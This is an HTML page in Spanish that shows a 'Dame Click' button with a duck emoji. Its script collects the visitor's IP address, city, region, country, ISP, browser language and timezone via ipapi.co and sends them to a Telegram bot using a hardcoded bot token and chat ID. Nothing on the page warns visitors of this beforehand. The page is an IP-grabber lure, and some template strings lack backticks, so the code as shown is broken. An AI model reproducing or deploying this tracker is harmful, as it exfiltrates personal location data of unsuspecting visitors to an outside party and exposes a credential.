<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Recolección Privada</title>
  <style>
    body {
      font-family: Arial;
      padding: 20px;
      background: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      text-align: center;
    }
    .box {
      background: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      max-width: 400px;
    }
    button {
      padding: 12px 24px;
      font-size: 18px;
      cursor: pointer;
      border: none;
      background-color: #4CAF50;
      color: white;
      border-radius: 6px;
      transition: background 0.3s;
    }
    button:hover {
      background-color: #45a049;
    }
    .duck {
      font-size: 64px;
      margin-top: 20px;
      display: none;
    }
    #status {
      margin-top: 15px;
      font-size: 14px;
      color: gray;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Aprieta el botón Porfavor</h2>
    <button id="startBtn">Dame Click</button>
    <div class="duck" id="duck">🦆</div>
    <div id="status"></div>
  </div>

<script>
(() => {
  // Reemplaza estos valores por los tuyos
  const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag"; // ← TU TOKEN DE TELEGRAM
  const CHAT_ID = "6065284869";     // ← TU ID DE CHAT O DEL USUARIO

  const startBtn = document.getElementById("startBtn");
  const duckEl = document.getElementById("duck");
  const statusEl = document.getElementById("status");

  startBtn.addEventListener("click", async () => {
    startBtn.disabled = true;
    startBtn.textContent = "Enviando...";
    duckEl.style.display = "block";
    statusEl.textContent = "Recopilando información...";

    try {
      // Obtener info de IP usando ipapi.co
      const ipResponse = await fetch("https://ipapi.co/json/"); 
      const ipData = await ipResponse.json();

      // Formatear mensaje
      const message = 
🚨 Datos del usuario 🦆

IP: ${ipData.ip}
Región: ${ipData.region}
Ciudad: ${ipData.city}
País: ${ipData.country_name}
ISP: ${ipData.org}
Continente: ${ipData.continent_code}
Idioma del navegador: ${navigator.language}
Zona horaria: ${Intl.DateTimeFormat().resolvedOptions().timeZone}

Fecha: ${new Date().toLocaleString()}
;

      // Enviar a Telegram
      await sendToTelegram(message);

      statusEl.innerHTML = "<span style='color:green;'>Datos enviados correctamente 🦆</span>";
    } catch (e) {
      console.error(e);
      statusEl.innerHTML = "<span style='color:red;'>Error al enviar datos</span>";
    }

    startBtn.disabled = false;
    startBtn.textContent = "Dame Click";
  });

  async function sendToTelegram(message) {
    try {
      const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage; 
      const response = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
        }),
      });
      if (!response.ok) throw new Error("Fallo al enviar mensaje");
      return await response.json();
    } catch (e) {
      throw new Error("No se pudo enviar a Telegram: " + e.message);
    }
  }

})();
</script>
</body>
</html>
